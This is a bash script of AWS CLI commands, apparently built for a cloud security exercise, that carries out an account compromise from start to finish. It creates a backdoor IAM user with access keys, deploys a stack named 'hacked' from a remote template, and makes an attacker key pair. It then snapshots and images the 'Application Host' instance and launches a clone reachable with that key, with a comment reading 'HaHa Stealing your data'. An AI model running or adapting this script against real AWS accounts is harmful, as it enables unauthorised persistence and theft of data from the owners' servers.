#!/usr/bin/env bash

aws iam create-user --user-name Ip0wneDU
aws cloudformation create-stack --stack-name hacked --template-body https://s3.us-east-2.amazonaws.com/710582532708securityjam20/KickOff.sh.template --region us-east-2 --capabilities="CAPABILITY_NAMED_IAM"

    until [ "$status" = "CREATE_COMPLETE" ]; do
        status=$(aws cloudformation describe-stacks --stack-name "hacked"  --output text  --region us-east-2 | cut -f6 -d$'\t')
        echo "Stack: $snapshot Status: $status"
        sleep 5
    done

keyPair=$(aws ec2 create-key-pair --key-name 0wned  --region us-east-2 --output text)

key=$(aws iam create-access-key --user-name Ip0wneDU  --region us-east-2  --output text)
AWS_ACCESS_KEY=$(echo keyPair | cut -d " " -f2)
AWS_SECRET_KEY=$(echo $keyPair | cut -d " " -f4)
#export AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY
#export AWS_SECRET_ACCESS_KEY=$AWS_SECRET_KEY

#aws ec2 create-image --instance-id i-0f3d52166ee6dc9b8 --name "My server" --description "HaHa Stealing your data" --no-reboot > imageId
id=$(aws ec2 describe-instances --filters "Name=tag:Name,Values=Application Host" --output  text  --region us-east-2 | awk -F"\t" '$1=="INSTANCES" {print $8}')

#Set $id to the ID of the EC2 instance you want to clone
#id=i-########

#Storing the description of the EC2 instance in a variable
instance_description=$(aws ec2 describe-instances --instance-id $id  --output text  --region us-east-2)

#Reading the block devices of the instance; the cut command divides the string at the tab and extracts the second field
dev_list=$(echo "$instance_description" | grep BLOCKDEVICE | cut -f2 -d$'\t')
#Storing the block devices in an array
devs=($dev_list)

#Reading the EBS volumes of the instance
vol_list=$(echo "$instance_description" | grep EBS | cut -f5 -d$'\t')

#Storing the volumes in an array
vols=($vol_list)

#Reading the instance type
instance_type=$(echo "$instance_description" | grep INSTANCE | cut -f9 -d$'\t')

#Reading the AWS region; the second grep command uses regex to remove the last digit because otherwise ec2-run-instance will fail
region=$(echo "$instance_description" | grep INSTANCE | cut -f11 -d$'\t' | grep -o -E '.*-.*-\d')

#Reading the kernel ID
kernel=$(echo "$instance_description" | grep INSTANCE | cut -f7 -d$'\t')

#Reading the security group
security_group=$(echo "$instance_description" | grep SECURITYGROUPS | cut -f2 -d$'\t')

#Reading the key pair name
key=$(echo "$instance_description" | grep INSTANCE | cut -f7 -d$'\t')

#Subnet
subnet=$(echo "$instance_description" | grep INSTANCES | cut -f18 -d$'\t')

#Displaying the instance features
echo "Instance features:"
echo ""
echo "Block devices: ${devs[@]}"
echo "Volumes: ${vols[@]}"
echo "Instance type: $instance_type"
echo "Region: $region "
echo "Kernel ID: $kernel"
echo "Security group: $security_group"
echo "Key pair name: $key"

#Displaying the volumes with their features
echo ""
echo "Volumes found:"

let j=0 #Index for the volumes array
#Iterating through the volumes array to read the required features for the snapshots
for vol in "${vols[@]}"; do

    #Reading the volume features
    volumes=$(aws ec2 describe-volumes --volume-ids $vol  --output text  --region us-east-2)

    #Storing the volume sizes in an array
    vol_sizes[$j]=$(echo "$volumes" | grep VOLUME | awk '{print $3}')

    #Reading the volume types (gp2: general purpose (SSD), io1: provisioned IOPS (SSD), Not: standard magnetic)
    vol_types[$j]=$(echo "$volumes" | grep VOLUME | awk '{print $8}')

    #When we create the volume later, we have to omit the type for standard volumes
    if [ ${vol_types[$j]} == 'Not' ]; then
        vol_types[$j]=''
    fi

    #Reading the "Delete on Termination" setting; true if the volume will be deleted on instance termination, otherwise false
    vol_dels[$j]=$(echo "$volumes" | grep ATTACHMENT | awk '{print $7}')

    #Displaying the volume features
    echo ""
    echo "Volume id: " $vol
    echo "Size: "${vol_sizes[$j]}
    echo "Type: "${vol_types[$j]}
    echo "Delete on instance termination: "${vol_dels[$j]}

    #Creating a snapshot for each volume
    snapshots[$j]=$(aws ec2 create-snapshot --volume-id $vol --output text  --region us-east-2 | cut -f5 -d$'\t')

    (( ++j ))
done

#We have to wait until all snapshots have been built so we can create the new volumes
echo ""
echo "Checking the status of the snapshots"

#Iterating through all snapshots in the array
for snapshot in "${snapshots[@]}"; do
    status=''
    until [ "$status" = "completed" ]; do
        status=$(aws ec2 describe-snapshots --snapshot-id $snapshot  --output text  --region us-east-2 | awk '{print $7}')
        echo "Snapshot: $snapshot Status: $status"
        sleep 5
    done
done

#We use the first snapshot for the AMI because it contains the root device; $ami stores the AMI ID, and we use the snapshot name as the AMI name
ami=$(aws ec2 create-image --instance-id $id --name test --no-reboot --output text  --region us-east-2 | awk '{print $1}')

let l=0
#Iterating through the snapshots to create the --block-device-mapping parameter for the volumes we have to attach to the instance
for snapshot in "${snapshots[@]}"; do
    blockdevice=" -b ${devs[$l]}=${snapshots[$l]}:${vol_sizes[$l]}:${vol_dels[$l]}:${vol_types[$l]}"

    #Concatenating all parameters for the block devices
    blockdevices=$blockdevices$blockdevice
    (( ++l ))
done

#Creating the EC2 instance; if you want to add an ephemeral storage (if the instance type supports it), you can add something like this: -b "/dev/xvdb=ephemeral0"
#instance=$(aws ec2 run-instances --image-id $ami --key-name $key --security-groups $security_group ---instance-type $instance_type --block-device-mappings $blockdevices)
instance=$(aws ec2 run-instances --image-id $ami --count 1 --instance-type $instance_type --key-name 0wned --security-group-ids $security_group --subnet-id $subnet  --region us-east-2)
#Reading the ID of the new instance
new_id=$(echo $instance | awk '{print $6}')

#Waiting until the instance is running and displaying its status
until [[ "$status" = *"running"* ]]; do
    status=$(aws ec2 describe-instances --instance-ids $new_id --output text  --region us-east-2| grep STATE | cut -f3 -d$'\t')
    echo ""
    echo "Instance status: $status"
    sleep 5
done

#Reading the public IP address so we can connect to the instance
ip=$(aws ec2 describe-instances --instance-ids $new_id --output text  --region us-east-2| grep ASSOCIATION | cut -f4 -d$'\t')
echo ""
echo "Instance IP address: $ip"

#curl https://s3.us-east-2.amazonaws.com/710582532708securityjam20/WebSite+Alt.zip -o Alt.zip



